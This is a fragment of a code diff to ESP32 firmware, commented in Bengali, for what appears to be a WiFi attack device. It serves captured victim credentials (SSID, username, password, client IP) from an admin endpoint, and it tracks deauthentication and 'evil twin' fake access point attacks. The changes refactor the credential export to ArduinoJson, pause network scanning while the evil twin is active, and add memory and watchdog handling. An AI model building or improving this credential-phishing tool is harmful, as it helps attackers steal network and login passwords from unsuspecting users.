         adminServer.send(200, "application/json", json);
     });
     
     // ক্রেডেনশিয়াল লিস্ট
     adminServer.on("/getCredentials", HTTP_GET, []() {
-        String json = "[";
-        for(int i = 0; i < credCount; i++) {
-            json += "{";
-            json += "\"timestamp\":\"" + capturedCreds[i].timestamp + "\",";
-            json += "\"ssid\":\"" + capturedCreds[i].ssid + "\",";
-            json += "\"username\":\"" + capturedCreds[i].username + "\",";
-            json += "\"password\":\"" + capturedCreds[i].password + "\",";
-            json += "\"clientIP\":\"" + capturedCreds[i].clientIP + "\"";
-            json += "}";
-            if(i < credCount - 1) json += ",";
-        }
-        json += "]";
+        DynamicJsonDocument doc(2048);
+        JsonArray creds = doc.to<JsonArray>();
         
+        for(int i = 0; i < credCount; i++) {
+            JsonObject cred = creds.createNestedObject();
+            cred["timestamp"] = capturedCreds[i].timestamp;
+            cred["ssid"] = capturedCreds[i].ssid;
+            cred["username"] = capturedCreds[i].username;
+            cred["password"] = capturedCreds[i].password;
+            cred["clientIP"] = capturedCreds[i].clientIP;
+        }
+        
+        String json;
+        serializeJson(doc, json);
         adminServer.send(200, "application/json", json);
     });
     
@@ -1151,6 +1768,9 @@ void setup() {
     
     // WiFi কনফিগারেশন
     WiFi.mode(WIFI_AP);
+    
+    // Disable WiFi power save for better performance
+    esp_wifi_set_ps(WIFI_PS_NONE);
     
     // Admin AP তৈরি করুন
     WiFi.softAP(adminSSID, adminPASS);
@@ -1199,8 +1819,21 @@ void loop() {
     
     // প্রতি 30 সেকেন্ডে নেটওয়ার্ক স্ক্যান (যখন Deauth অ্যাক্টিভ নয়)
     static unsigned long lastScan = 0;
-    if(!isDeauthActive && millis() - lastScan > 30000) {
+    if(!isDeauthActive && !isEvilTwinActive && millis() - lastScan > 30000) {
         scanNetworks();
         lastScan = millis();
     }
+    
+    // Memory warning check (প্রতি 10 সেকেন্ডে)
+    static unsigned long lastMemCheck = 0;
+    if(millis() - lastMemCheck > 10000) {
+        uint32_t freeHeap = ESP.getFreeHeap();
+        if(freeHeap < 30000) {  // Less than 30KB
+            Serial.printf("[WARNING] ⚠️ Low memory: %d bytes free\n", freeHeap);
+        }
+        lastMemCheck = millis();
+    }
+    
+    // Small delay to prevent watchdog issues
+    delay(1);
 }
